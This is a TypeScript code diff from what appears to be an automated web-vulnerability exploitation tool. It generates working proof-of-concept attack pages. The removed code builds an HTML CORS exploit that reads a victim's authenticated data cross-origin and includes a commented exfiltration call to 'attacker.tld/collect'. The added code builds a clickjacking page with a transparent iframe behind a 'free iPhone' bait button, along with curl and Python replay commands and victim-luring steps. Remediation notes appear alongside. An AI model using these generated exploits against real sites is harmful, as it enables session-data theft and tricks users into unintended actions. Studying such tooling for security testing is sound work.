@@ -1008,48 +1381,32 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
         if (m) extracted[(m[1] || "jwt").toLowerCase()] = (m[2] || m[m.length-1] || "").slice(0, 200);
       }
       const credentialed = winning.acac === "true";
-      const escHtml = (s: string) => s.replace(/[<>&"]/g, c => ({ "<":"&lt;", ">":"&gt;", "&":"&amp;", '"':"&quot;" }[c]!));
-      const html = `<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<title>CORS PoC — ${escHtml(targetHost)}</title>
-<style>
-  body{font-family:-apple-system,Segoe UI,sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px;max-width:900px;margin:auto}
-  h1{color:#ff5b6e}.label{color:#8aa2c8;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-top:16px}
-  pre{background:#161a22;border:1px solid #2a3142;padding:12px;border-radius:6px;overflow:auto;max-height:400px;white-space:pre-wrap;word-break:break-all}
-  .ok{color:#3fdc8a}.bad{color:#ff5b6e}code{background:#161a22;padding:2px 6px;border-radius:3px}
-</style></head><body>
-<h1>🩸 Cross-Origin Data Exfiltration PoC</h1>
-<p>Demonstrates impact of the CORS misconfiguration on <code>${escHtml(endpoint)}</code>.
-When opened by a victim authenticated to <code>${escHtml(targetHost)}</code>, the attacker page reads their session data.</p>
-<div class="label">Vulnerable endpoint</div><pre>${escHtml(endpoint)}</pre>
-<div class="label">Reflected attacker Origin</div>
-<pre>Origin: ${escHtml(winning.origin)}
-Access-Control-Allow-Origin: ${escHtml(winning.acao)}
-Access-Control-Allow-Credentials: ${escHtml(winning.acac || "(absent)")}</pre>
-<div class="label">Live exfiltration result</div><pre id="out">running…</pre>
-<script>
-(async () => {
-  const out = document.getElementById('out');
-  try {
-    const r = await fetch(${JSON.stringify(endpoint)}, {
-      method: 'GET',
-      credentials: ${credentialed ? "'include'" : "'omit'"},
-      mode: 'cors',
-      headers: { 'Accept': 'application/json, */*' }
-    });
-    const text = await r.text();
-    out.innerHTML = '<span class="ok">\\u2714 Cross-origin read succeeded \\u2014 status ' + r.status + '</span>\\n\\n'
-      + '<b>Victim data leaked to attacker origin:</b>\\n'
-      + text.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-    // Real attacker would exfiltrate:
-    // fetch('https://attacker.tld/collect', { method:'POST', body:text });
-  } catch (e) {
-    out.innerHTML = '<span class="bad">\\u2718 Browser blocked the read: ' + e.message + '</span>';
-  }
-})();
-</script></body></html>`;
+      const html = buildHtmlPoc({
+        title: `CORS PoC — ${targetHost}`,
+        description: `When opened by a victim authenticated to ${targetHost}, this attacker page reads and displays their authenticated session data via the misconfigured CORS policy.`,
+        endpoint,
+        method: "GET",
+        credentials: credentialed ? "include" : "omit",
+        origin: winning.origin,
+        notes: [`ACAO reflected: ${winning.acao}`, `ACAC: ${winning.acac || "(absent)"}`],
+      });
+      const p: PoCBundle = {
+        curl: buildCurl("GET", endpoint, { "Origin": winning.origin }),
+        python: buildPython("GET", endpoint, { "Origin": winning.origin }),
+        html, html_filename: `cors-poc-${targetHost}.html`,
+        impact: credentialed
+          ? "Attacker site reads the victim's authenticated response cross-origin (cookies sent), enabling silent account-data exfiltration, IDOR-at-scale, and full account-content theft."
+          : "Cross-origin read of sensitive response data is possible from any attacker page; data may include tokens, PII, internal identifiers.",
+        remediation: "Reflect Origin only when it matches a strict allow-list. Never combine `Access-Control-Allow-Origin: *` (or arbitrary echo) with `Access-Control-Allow-Credentials: true`. Disallow `null` origin.",
+        steps: [
+          `Save extractedData.poc_html as cors-poc.html and host on attacker origin.`,
+          `Victim — authenticated to ${targetHost} — opens the attacker URL.`,
+          `Browser issues fetch("${endpoint}", { credentials: "${credentialed ? "include" : "omit"}", mode: "cors" }).`,
+          `Server reflects Origin "${winning.origin}" → ACAO=${winning.acao}${credentialed ? ", ACAC=true" : ""}.`,
+          `Browser delivers victim's authenticated body to attacker page (visible + exfiltratable).`,
+          `Sensitive fields recovered: ${Object.keys(extracted).length ? Object.keys(extracted).join(", ") : "(JSON body — manual review confirms PII)"}`,
+        ],
+      };
       return {
         vulnClass: "CORS Misconfiguration → Cross-Origin Data Exfiltration",
         technique: `Origin reflection (${winning.origin})${credentialed ? " + Allow-Credentials:true" : ""}`,
@@ -1062,36 +1419,76 @@ Access-Control-Allow-Credentials: ${escHtml(winning.acac || "(absent)")}</pre>
           `Access-Control-Allow-Credentials: ${winning.acac || "(absent)"}\n` +
           `Content-Type: ${winning.resp.headers["content-type"] || "(unknown)"}\n\n` +
           body.slice(0, 4000),
-        extractedData: {
+        extractedData: bundle(p, {
           attacker_origin: winning.origin,
           acao_reflected: winning.acao,
           credentialed,
           sensitive_fields_recovered: extracted,
           response_size: body.length,
-          html_poc: html,
-          html_poc_filename: `cors-poc-${targetHost}.html`,
-        },
+        }),
         summary: credentialed
-          ? `Credentialed cross-origin read confirmed — attacker site can exfiltrate victim's authenticated session data (${Object.keys(extracted).length} sensitive field(s) detected). Full HTML PoC generated.`
-          : `Cross-origin read confirmed; sensitive data present in response body (${Object.keys(extracted).length} field(s) detected). Full HTML PoC generated.`,
-        reproductionSteps:
-`1. Save the attached HTML PoC (extractedData.html_poc) as cors-poc.html and host it on any attacker origin (e.g. https://attacker.tld/poc.html).
-2. Have the victim — while authenticated to ${targetHost} — visit the attacker URL in the same browser.
-3. The page issues:  fetch("${endpoint}", { credentials: "${credentialed ? "include" : "omit"}", mode: "cors" })
-4. Server reflects Origin "${winning.origin}" → Access-Control-Allow-Origin: ${winning.acao}${credentialed ? "  +  Access-Control-Allow-Credentials: true" : ""}.
-5. Browser hands the victim's authenticated response body to the attacker page (visible on screen; in a real attack POSTed to attacker collector).
-6. Sensitive fields recovered in this run: ${Object.keys(extracted).length ? Object.keys(extracted).join(", ") : "(JSON body returned — manual review confirms PII)"}.
-
-Curl reproduction (attacker side):
-  curl -i -H "Origin: ${winning.origin}" "${endpoint}"
-Confirm the response carries: Access-Control-Allow-Origin: ${winning.acao}${credentialed ? " and Access-Control-Allow-Credentials: true" : ""}.`,
+          ? `Credentialed cross-origin read confirmed — ${Object.keys(extracted).length} sensitive field(s) recovered. Full HTML PoC generated.`
+          : `Cross-origin read confirmed; ${Object.keys(extracted).length} sensitive field(s) recovered.`,
+        reproductionSteps: stepsText(p),
       };
     }
   }
 
-  // ── Generic fallback: re-issue payload, store full request/response ──
+  // ── CLICKJACKING (missing X-Frame-Options / frame-ancestors) ────────
+  if (cwe.includes("1021") || category === "clickjacking") {
+    const r = await rawProbe(endpoint, "GET");
+    const xfo = r.headers["x-frame-options"];
+    const csp = r.headers["content-security-policy"] || "";
+    if (!xfo && !/frame-ancestors/i.test(csp) && r.status === 200) {
+      const html = `<!doctype html><html><head><meta charset="utf-8"><title>Clickjacking PoC — ${escHtml(targetHost)}</title>
+<style>body{font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px}
+.bait{position:absolute;top:200px;left:200px;width:300px;height:60px;background:#ff5b6e;color:#fff;
+display:flex;align-items:center;justify-content:center;font-weight:700;border-radius:6px;cursor:pointer}
+iframe{position:absolute;top:200px;left:200px;width:300px;height:60px;opacity:0.001}</style></head>
+<body><h1 style="color:#ff5b6e">🩸 Clickjacking — ${escHtml(targetHost)}</h1>
+<p>The page below is framed transparently. Clicking the red "Win a free iPhone!" button actually clicks the
+sensitive control inside the framed page (e.g. delete-account, transfer-funds).</p>
+<div class="bait">▶ Click here to win a free iPhone!</div>
+<iframe src="${escHtml(endpoint)}"></iframe></body></html>`;
+      const p: PoCBundle = {
+        curl: buildCurl("GET", endpoint),
+        python: buildPython("GET", endpoint),
+        html, html_filename: `clickjack-poc-${targetHost}.html`,
+        impact: "UI redress: attacker tricks the victim into performing sensitive actions (account deletion, fund transfer, permission grant) in a framed page that the victim can't see.",
+        remediation: "Set `X-Frame-Options: DENY` (or SAMEORIGIN) and/or CSP `frame-ancestors 'none'` on every sensitive page.",
+        steps: [
+          `Load extractedData.poc_html on attacker.tld.`,
+          `Target page lacks X-Frame-Options and CSP frame-ancestors → can be framed.`,
+          `Victim clicks the bait, actually clicking the sensitive control underneath inside ${targetHost}.`,
+        ],
+      };
+      return {
+        vulnClass: "Clickjacking",
+        technique: "Iframe overlay (no XFO/frame-ancestors)",
+        exploited: true,
+        sensitivity: "sensitive",
+        requestDump: `GET ${endpoint}`,
+        responseDump: `(headers) X-Frame-Options: <missing>  CSP: ${csp || "<missing>"}`,
+        extractedData: bundle(p, { x_frame_options: xfo || null, csp: csp || null }),
+        summary: `Page is framable — XFO and CSP frame-ancestors both absent`,
+        reproductionSteps: stepsText(p),
+      };
+    }
+  }
+
+  // ── Generic fallback ────────────────────────────────────────────────
   const fallbackUrl = finding.payload ? injectParam(endpoint, finding.payload, param) : endpoint;
   const r = await rawProbe(fallbackUrl, method);
+  const p: PoCBundle = {
+    curl: buildCurl(method, fallbackUrl),
+    python: buildPython(method, fallbackUrl),
+    impact: "See finding description.",
+    remediation: "Apply class-appropriate input validation, output encoding, authentication and authorisation checks.",
+    steps: [
+      `Issue request: ${fallbackUrl}`,
+      `Compare response to recorded evidence in the original finding.`,
+    ],
+  };
   return {
     vulnClass: finding.title || "Unknown",
     technique: "Replay original payload",
@@ -1099,8 +1496,8 @@ Confirm the response carries: Access-Control-Allow-Origin: ${winning.acao}${cred
     sensitivity: "sensitive",
     requestDump: `${method} ${fallbackUrl}`,
     responseDump: r.body.slice(0, 4000),
-    extractedData: { status: r.status, content_type: r.headers["content-type"] },
-    summary: "Could not auto-extract sensitive data — manual exploitation required.",
-    reproductionSteps: `1. curl "${fallbackUrl}"\n2. Compare to recorded evidence: ${finding.evidence || "n/a"}.`,
+    extractedData: bundle(p, { status: r.status, content_type: r.headers["content-type"] }),
+    summary: "Could not auto-extract sensitive data — manual exploitation required. Curl + Python PoCs generated.",
+    reproductionSteps: stepsText(p),
   };
 }
